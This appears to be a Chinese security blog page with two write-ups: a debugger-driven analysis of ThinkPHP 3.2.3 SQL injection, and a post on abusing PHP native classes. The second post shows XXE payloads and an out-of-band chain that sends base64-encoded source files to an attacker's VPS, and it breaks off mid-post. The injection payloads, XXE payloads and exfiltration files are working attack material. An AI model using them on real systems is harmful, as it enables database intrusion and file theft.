<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Hexo</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Hexo"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Hexo"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="Hexo"><meta property="og:url" content="http://example.com/"><meta property="og:site_name" content="Hexo"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:author" content="John Doe"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com"},"headline":"Hexo","image":["http://example.com/img/og_image.png"],"author":{"@type":"Person","name":"John Doe"},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-20T08:34:24.000Z" title="2021-04-20T08:34:24.000Z">2021-04-20</time>发表</span><span class="level-item"><time dateTime="2021-04-20T08:48:10.417Z" title="2021-04-20T08:48:10.417Z">2021-04-20</time>更新</span><span class="level-item">8 分钟读完 (大约1248个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/20/ThinkPhp3-2-3%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">ThinkPhp3.2.3注入漏洞总结</a></h1><div class="content"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>数据库连接配置</p>
<p><img src="https://www.hualigs.cn/image/607e923dad073.jpg"></p>
<h1 id="thinkphp3-2-3-where注入"><a href="#thinkphp3-2-3-where注入" class="headerlink" title="thinkphp3.2.3 where注入"></a>thinkphp3.2.3 where注入</h1><p>控制器</p>
<p>/Application/Home/Controller/IndexController.class.php</p>
<p><img src="https://www.hualigs.cn/image/607e923dae04f.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607e923db9e10.jpg"></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?id[where]&#x3D;1%20and%201&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e92437644e.jpg"></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在<code>I()</code>方法上打一个断点，<code>I()</code>方法用来获取GET和POST参数</p>
<p><img src="https://www.hualigs.cn/image/607e924305371.jpg"></p>
<p>在<code>I()</code>方法中经过<code>htmlspecialchars()</code>处理，再经过functions.php中<code>think_filter</code>函数过滤，这两处过滤对payload没有影响，可以直接忽略</p>
<p><img src="https://www.hualigs.cn/image/607e923de6764.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607e923dcbc98.jpg"></p>
<p>think_filter函数</p>
<p><img src="https://www.hualigs.cn/image/607e923df0bb8.jpg"></p>
<p>/ThinkPHP/Library/Think/Model.class.php</p>
<p>接下来进入<code>find()</code>方法处理 </p>
<p>参数经过Model.class.php中的<code>_parseOptions()</code>方法处理后带入select方法进行查询，可以看到注入语句在经过<code>_parseOptions()</code>后就变成了int类型，后面的语句被去除了。</p>
<p><img src="https://www.hualigs.cn/image/607e923e02118.jpg"></p>
<p><code>_parseOptions</code>执行前，注入语句没有发生变化</p>
<p><img src="https://www.hualigs.cn/image/607e924155ec7.jpg"></p>
<p>跟进·<code>_parseOptions()</code>，满足条件进入<code>_parseType()</code></p>
<p><img src="https://www.hualigs.cn/image/607e92431e9fe.jpg"></p>
<p>在经过<code>_parseType</code>处理后，注入语句被转换成了int型，只保留了前面的数字,注意这里的<code>$options[&#39;where&#39;]</code>是一个array</p>
<p><img src="https://www.hualigs.cn/image/607e92428e1eb.jpg"></p>
<p>跟进<code>_parseType()</code>，发现这里进行了强制类型转换，把payload强制转换成了int型，去掉了后面部分</p>
<p><img src="https://www.hualigs.cn/image/607e923e1ab2f.jpg"></p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>只要<code>is_array($options[&#39;where&#39;])</code>这个条件不满足，就不会进入到强制转换函数中，payload也就不会被过滤，所以要想办法让<code>$options[&#39;where&#39;]</code>不为数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; is_array(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>]))</span><br></pre></td></tr></table></figure>



<p>当我们传入的payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;45789 and 1&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p><code>_parseOptions</code>执行前，<code>$options[&#39;where&#39;]</code>就是一个数组了</p>
<p><img src="https://www.hualigs.cn/image/607e92428e1eb.jpg"></p>
<p><code>find()</code>函数开始存在一个判断，如果传入的参数为数字或者字符串，就会把他转换成数组再赋值给<code>$options[&#39;where&#39;]</code>，这样就会满足条件<code>is_array($options[&#39;where&#39;])</code>从而导致payload被转换。</p>
<p>这里传入<code>find()</code>的参数是<code>45789 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code>，满足了if判断中的条件，注入失败。</p>
<p><img src="https://www.hualigs.cn/image/607e9241b5394.jpg"></p>
<p>当payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;45789 and 1&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p>if条件不满足</p>
<p><code>options[&#39;where&#39;]</code>就会是一个字符串，<code>is_array($options[&#39;where&#39;])</code>条件不满足，就成功绕过了</p>
<p><img src="https://www.hualigs.cn/image/607e9241b5394.jpg"></p>
<p>注入语句没有被转换，直接被带入执行。</p>
<p><img src="https://www.hualigs.cn/image/607e92400b9b7.jpg"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>注入产生的原因是构造的poc绕过了thinkphp对<code>$option[&#39;where&#39;]</code>是否是一个数组的判断，从而不满足<code>is_array($options[&#39;where&#39;])</code>，绕过了<code>_parseType</code>函数过滤，从而导致了注入。</p>
<h1 id="Thinkphp-3-2-3-exp注入"><a href="#Thinkphp-3-2-3-exp注入" class="headerlink" title="Thinkphp 3.2.3 exp注入"></a>Thinkphp 3.2.3 exp注入</h1><p>控制器</p>
<p><img src="https://www.hualigs.cn/image/607e923fb01b1.jpg"></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?username[0]&#x3D;exp&amp;username[1]&#x3D;&#x3D;1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e924383547.jpg"></p>
<p><code>find()</code>执行到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$resultSet</span>=<span class="keyword">$this</span>-&gt;db-&gt;select(<span class="variable">$options</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e924112362.jpg"></p>
<p>/ThinkPHP/Library/Think/Db/Driver.class.php</p>
<p>进入<code>select()</code></p>
<p><img src="https://www.hualigs.cn/image/607e92405be65.jpg"></p>
<p>进入<code>buildSelectSql()</code></p>
<p><img src="https://www.hualigs.cn/image/607e923f74c7f.jpg"></p>
<p>进入<code>parsesql()</code>，关注<code>parseWhere()</code>函数</p>
<p><img src="https://www.hualigs.cn/image/607e92424058c.jpg"></p>
<p><code>parseWhere()</code>函数调用<code>parseWhereItem()</code></p>
<p>elseif语句中直接拼接了where条件到sql语句中，到达该语句需要满足两个条件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(is_string(<span class="variable">$val</span>[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>

<p>由于<code>$exp=strtolower($val[0]);</code>，传入<code>username[0]=exp&amp;username[1]=1 and 1=1</code></p>
<p><img src="https://www.hualigs.cn/image/607e92426c997.jpg"></p>
<p>注意控制器那里不能使用<code>I()</code>方法来获取参数，因为前面提到<code>I()</code>方法中调用了<code>think_filter()</code>函数，该函数会过滤exp，导致注入失败</p>
<p><img src="https://www.hualigs.cn/image/607e923df0bb8.jpg"></p>
<h1 id="thinkphp-3-2-3-bind注入"><a href="#thinkphp-3-2-3-bind注入" class="headerlink" title="thinkphp 3.2.3 bind注入"></a>thinkphp 3.2.3 bind注入</h1><p>控制器</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$User</span> = M(<span class="string">&quot;Users&quot;</span>);</span><br><span class="line">    <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>] = I(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">    <span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>] = I(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    <span class="variable">$valu</span> = <span class="variable">$User</span>-&gt;where(<span class="variable">$user</span>)-&gt;save(<span class="variable">$data</span>);</span><br><span class="line">    var_dump(<span class="variable">$valu</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?id[0]&#x3D;bind&amp;id[1]&#x3D;0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e924209d7f.jpg"></p>
<p>这里需要注意<code>id[1]=0</code>原理在下面说</p>
<p><code>save()</code>函数中添加断点</p>
<p><img src="https://www.hualigs.cn/image/607e923fe8d55.jpg"></p>
<p>/ThinkPHP/Library/Think/Db/Driver.class.php</p>
<p>进入<code>update()</code></p>
<p>又经过了<code>parseWhere()</code>函数，除了之前利用的<code>exp</code>还有<code>bind</code>可以利用</p>
<p><img src="https://www.hualigs.cn/image/607e9240d4c79.jpg"></p>
<p>直接传递payload，发现添加了冒号，注入失败</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?id[0]&#x3D;bind&amp;id[1]&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e924147690.jpg"></p>
<p>可以看到<code>bindParam()</code>添加冒号</p>
<p><img src="https://www.hualigs.cn/image/607e923f510cf.jpg"></p>
<p>ThinkPHP/Library/Think/Db/Driver.class.php</p>
<p><code>execute()</code>将<code>:0</code>替换为传入参数，让参数等于0，相当于<code>:0</code>，然后被替换为1，成功注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;bind))&#123;</span><br><span class="line">            <span class="variable">$that</span>   =   <span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queryStr =   strtr(<span class="keyword">$this</span>-&gt;queryStr,array_map(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$val</span></span>) <span class="title">use</span>(<span class="params"><span class="variable">$that</span></span>)</span>&#123; <span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$that</span>-&gt;escapeString(<span class="variable">$val</span>).<span class="string">&#x27;\&#x27;&#x27;</span>; &#125;,<span class="keyword">$this</span>-&gt;bind));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/11444871.html">https://www.cnblogs.com/-qing-/p/11444871.html</a></p>
<p><a target="_blank" rel="noopener" href="https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/">https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/</a></p>
<p><a target="_blank" rel="noopener" href="https://syst1m.com/post/summary-of-thinkphp3-vulnerability/">https://syst1m.com/post/summary-of-thinkphp3-vulnerability/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.chabug.org/audit/1062.html">https://www.chabug.org/audit/1062.html</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-19T13:41:01.000Z" title="2021-04-19T13:41:01.000Z">2021-04-19</time>发表</span><span class="level-item"><time dateTime="2021-04-19T13:51:50.932Z" title="2021-04-19T13:51:50.932Z">2021-04-19</time>更新</span><span class="level-item">9 分钟读完 (大约1300个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/19/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">php原生类利用</a></h1><div class="content"><h1 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h1><p>在存在任意类实例化漏洞但是没有pop链的情况下，可以尝试利用原生类</p>
<h1 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h1><p>可以列出目录下的文件名</p>
<p>适用版本：php5.3.* php 7</p>
<p>第一个参数指定搜索的路径和类型，第二个参数为选择文件的哪个信息作为键名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&#x27;./*.php&#x27;</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>





<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$iterator</span> = <span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="keyword">__DIR__</span> . <span class="string">&#x27;./*.php&#x27;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$iterator</span>-&gt;valid()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$iterator</span>-&gt;current()-&gt;getFilename() . <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$iterator</span>-&gt;next();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h1><p>SimpleXMLElement::__contruct</p>
<p>Libxml2.9后默认不允许解析外部实体，可以通过函数参数LIBXML_NOENT开启解析</p>
<p><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c372164.jpg"><img src="php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8.assets/607d89c378864.jpg">利用</p>
<p>根据可控方式选择</p>
<h3 id="本地读取"><a href="#本地读取" class="headerlink" title="本地读取"></a>本地读取</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$classname</span>))&#123;</span><br><span class="line">    <span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>);</span><br><span class="line">    var_dump(<span class="variable">$newclass</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$newclass</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [ </span></span><br><span class="line"><span class="string">     &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./1.php&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;x&gt;&amp;xxe;&lt;/x&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> SimpleXMLElement(<span class="variable">$a</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要两个参数可控</p>
<p>利用<code>SimpleXMLElement</code>构造一个XML文档，从而利用 XXE读取文件 。当文件中有&lt; &gt; &amp; ‘ “ 这5个符号时，会导致XML文件解析错误，所以要利用php://filter，将要读取的文件内容经过 base64编码 后输出。如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[   </span><br><span class="line">&lt;!ENTITY name SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&quot; &gt;]</span><br><span class="line">&gt;</span><br><span class="line">&lt;a&gt;&amp;name;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>有几个地方需要注意以下，在url中不能直接打<code>&amp;</code> 会被歧义，我们使用 <code>%26</code> 还有就是<code>resource=</code>后面不需要引号包裹。第二个参数里的2对应的模式是 LIBXML_NOENT。<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY name SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&quot; &gt;]&gt;&lt;a&gt;%26name;&lt;&#x2F;a&gt;&amp;param2&#x3D;2</span><br></pre></td></tr></table></figure>



<p>至于为什么第二个参数为二，实际上这里2对应的模式是 LIBXML_NOENT ，我们直接记住用二吧不然就是直接百度。</p>
<h3 id="远程读取"><a href="#远程读取" class="headerlink" title="远程读取"></a>远程读取</h3><p>必须有三个参数可控，才能读取远程xml文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param3</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(class_exists(<span class="variable">$classname</span>))&#123;</span><br><span class="line">    <span class="comment">//$newclass = new $classname($param,$param2);</span></span><br><span class="line">    <span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>,<span class="variable">$param3</span>);</span><br><span class="line">    var_dump(<span class="variable">$newclass</span>);</span><br><span class="line"><span class="comment">//    foreach ($newclass as $key=&gt;$value)</span></span><br><span class="line"><span class="comment">//        echo $key.&#x27;=&gt;&#x27;.$value.&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>SimpleXMLElement读取远程文件evil.xml-&gt;evil.xml请求send.xml，实际执行的是send.xml</p>
<p>send.php负责保存结果，在vps上构造如下evil.xml、send.xml和send.php这三个文件。</p>
<p>evil.xml：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;47.xxx.xxx.72&#x2F;send.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>send.xml：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.111.129&#x2F;send.php?file&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>



<p>send.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">file_put_contents(<span class="string">&quot;result.txt&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后在url中构造如下：</p>
